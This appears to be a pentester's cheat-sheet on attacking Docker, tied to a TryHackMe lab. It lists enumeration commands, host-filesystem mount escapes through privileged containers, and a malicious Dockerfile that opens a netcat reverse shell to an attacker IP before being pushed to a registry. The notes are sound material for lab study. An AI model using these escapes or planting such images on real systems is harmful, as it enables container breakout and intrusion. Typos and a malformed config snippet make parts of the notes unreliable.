# Docker Hacking
How do you know you are in a docker container?
[pspy](https://github.com/DominicBreuker/pspy) on Linux
Systernals proc\*-related tools or access with tasklist for windows.

## Preface
Add IP and domain name to /etc/hosts
```bash
echo "$IP $DOMAIN" | tee -a /etc/hosts
```

Configure Docker to trust your instance, either make `/etc/docker/daemon.json` or enter:
```json
{
	 "target-id" : ["docker-domain.name:$DOCKERPORTLOW","docker-domain.name:$DOCKERPORTHIGH"]
}
```

Control Docker(Linux)
```bash
systemctl stop docker
systemctl start docker
```

## What is Docker and Containers?

The Docker Engine that is layer of computational organisation above the hardware, the host OS and its kernel. It is not a hypervisor. Each Docker contain must have the same kernel type to operate. A container is commonly used to hold an environment or specific OS of an OS family to test system variation of running software. It is similar to VM hosting but Docker with there is **NO** virtualisation, hence requiring host OS that host Contain running similar OSes. Docker images are a read-only template of instruction for creating a Docker container. 

[Some ways to secure a docker container](https://faun.pub/hack-your-docker-container-6d3e1e1b363)

## Docker Commands

```bash
RUN echo "Docker"
COPY 
````

[Commands](https://docs.docker.com/engine/reference/commandline/cli/)

##  Docker Enumeration
On target machine enumerate the lay of the land:
```bash
docker -H $remotehost $dockcmd
docker ps
docker version
docker image ls
docker config ls
```

## GTFOBins/docker
[gtofbins](https://gtfobins.github.io/gtfobins/docker/#shell)

## Accessing Docker Container and exec..
```
docker -H $remotehost run -v /:/mnt --rm -it -d $image:$tag
docker -H $remotehost run -v /:/mnt --rm -it $image:$tag chroot /mnt sh

```

## Abusing Docker Registry
[Docker registries](https://docs.docker.com/registry/) are stateless server side application stores the Docker Image. Registries store and provide Docker images for use. Private registeries contain variouses called a **tag**. The Docker Registry is a JSON endpoint query it with 

Nmap scan to find the ports to interact with the container.

```bash
# postman
GET http://$domain:$port/
````

## Reversing Images
Download the image to reverse
```docker
docker pull app/app:$TAG
```

[Dive](https://github.com/wagoodman/dive) is a tool for exploring each layer in a docker image. 

## Uploading Malicious Docker Images
Dockerfile 
```docker
FROM $image:

RUN apt-get update -y
RUN apt-get install netcat -y # Socat would be better!
RUN nc -c /bin/sh $IP $PORT
```
Build image
```bash
docker build
```
Then upload with push:
```
docker push
```


## Building a Docker container

```bash
docker run  -d --privileged -v /:/host:rw $image

FROM $dir/$image
```

[Docker setup of kali  for hackers check this article](https://www.pentestpartners.com/security-blog/docker-for-hackers-a-pen-testers-guide/)

## References

[Docker](https://docs.docker.com/get-started/overview/)
[THM Room](https://tryhackme.com/room/dockerrodeo)
